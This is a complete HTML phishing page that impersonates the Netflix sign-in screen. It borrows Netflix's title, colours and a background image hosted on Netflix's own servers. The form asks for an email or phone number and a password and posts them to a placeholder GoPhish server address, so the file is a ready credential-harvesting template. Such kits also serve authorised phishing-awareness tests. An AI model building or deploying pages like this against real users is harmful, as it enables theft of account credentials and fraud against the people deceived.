<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Netflix</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap">
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background-color: #000;
      background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/8c5176de-e82b-4377-ae03-69c2a6aeff0f/2f785f80-dce7-4fa6-998f-bc1e3e7f996d/NG-en-20240401-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
      background-size: cover;
      background-position: center;
      color: #fff;
    }

    .overlay {
      background-color: rgba(0, 0, 0, 0.6);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-box {
      background-color: rgba(0, 0, 0, 0.8);
      padding: 40px;
      border-radius: 8px;
      max-width: 350px;
      width: 100%;
    }

    .login-box h1 {
      margin-bottom: 24px;
      font-size: 2em;
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border: none;
      border-radius: 4px;
    }

    .login-box input[type="submit"] {
      background-color: #e50914;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    .login-box input[type="submit"]:hover {
      background-color: #f6121d;
    }
  </style>
</head>
<body>
  <div class="overlay">
    <form class="login-box" method="POST" action="http://YOUR-GOPHISH-SERVER/POST">
      <h1>Sign In</h1>
      <input type="email" name="email" placeholder="Email or phone number" required />
      <input type="password" name="password" placeholder="Password" required />
      <input type="submit" value="Sign In" />
    </form>
  </div>
</body>
</html>
